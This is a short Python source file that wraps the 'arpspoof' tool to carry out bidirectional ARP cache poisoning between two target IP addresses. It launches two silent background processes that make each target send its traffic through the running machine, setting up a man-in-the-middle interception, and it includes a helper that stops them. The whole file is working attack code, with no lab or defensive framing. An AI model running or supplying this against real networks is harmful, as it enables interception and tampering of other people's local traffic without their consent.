import subprocess

def start_bidirectional_arpspoof(target1_ip, target2_ip, interface="eth0"):
    """
    Starts two arpspoof processes for bidirectional poisoning.
    - Poisons target1's cache, telling it target2 is at our MAC.
    - Poisons target2's cache, telling it target1 is at our MAC.
    Returns a list of the two process objects.
    """
    print(f"[+] Starting bidirectional arpspoof between {target1_ip} and {target2_ip}")
    
    # Process 1: Tell target1 that target2 is at our MAC
    cmd1 = ["arpspoof", "-i", interface, "-t", target1_ip, target2_ip]
    p1 = subprocess.Popen(cmd1, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Process 2: Tell target2 that target1 is at our MAC
    cmd2 = ["arpspoof", "-i", interface, "-t", target2_ip, target1_ip]
    p2 = subprocess.Popen(cmd2, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    return [p1, p2]

def stop_arpspoof(processes):
    """
    Stops a list of arpspoof processes.
    """
    if processes:
        print("[+] Stopping arpspoof processes...")
        for p in processes:
            if p.poll() is None: # Check if process is still running
                p.terminate()
                p.wait()
